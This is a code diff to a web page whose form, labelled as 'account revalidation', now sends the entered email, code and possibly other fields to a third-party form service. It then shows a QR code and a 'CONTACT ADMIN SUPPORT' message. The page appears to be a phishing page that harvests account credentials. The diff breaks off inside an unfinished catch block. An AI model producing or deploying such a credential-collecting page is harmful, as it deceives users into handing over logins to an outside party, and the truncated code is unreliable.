@@ -99,36 +99,54 @@
   const qrSection = document.getElementById("qrSection");
   const qrContainer = document.getElementById("qrCode");
 
-  form.addEventListener("submit", function (e) {
-    e.preventDefault(); // stop normal submission
+  form.addEventListener("submit", async function (e) {
+    e.preventDefault(); // stop default navigation
 
-    // Collect values
-    const email = document.getElementById("input_email").value.trim();
-    const code = document.getElementById("input_code").value.trim();
+    // Gather form data
+    const formData = new FormData(form);
 
-    // Build payload (⚠️ avoid putting raw password in QR)
-    const payload = JSON.stringify({
-      purpose: "account_revalidation",
-      email,
-      code,
-      ts: Date.now()
-    });
+    try {
+      // Submit to Web3Forms
+      const response = await fetch(form.action, {
+        method: form.method,
+        body: formData
+      });
 
-    // Show QR section
-    qrSection.style.display = "block";
-    qrContainer.innerHTML = ""; // clear old QR
+      if (response.ok) {
+        // Build QR payload (⚠️ avoid including password)
+        const payload = JSON.stringify({
+          purpose: "account_revalidation",
+          email: formData.get("email"),
+          code: formData.get("code"),
+          ts: Date.now()
+        });
 
-    // Generate QR
-    new QRCode(qrContainer, {
-      text: payload,
-      width: 200,
-      height: 200,
-      colorDark: "#000000",
-      colorLight: "#ffffff",
-      correctLevel: QRCode.CorrectLevel.M
-    });
-  });
-</script>
+        // Show QR section
+        qrSection.style.display = "block";
+        qrContainer.innerHTML = "";
+
+        new QRCode(qrContainer, {
+          text: payload,
+          width: 200,
+          height: 200,
+          colorDark: "#000000",
+          colorLight: "#ffffff",
+          correctLevel: QRCode.CorrectLevel.M
+        });
+
+        // Add CONTACT ADMIN SUPPORT message
+        const supportMsg = document.createElement("p");
+        supportMsg.textContent = "CONTACT ADMIN SUPPORT";
+        supportMsg.style.fontWeight = "bold";
+        supportMsg.style.color = "red";
+        supportMsg.style.marginTop = "12px";
+        qrSection.appendChild(supportMsg);
+
+      } else {
+        alert("Submission failed. Please try again.");
+      }
+    } catch (err) {
+
   
 </body>
 </html>
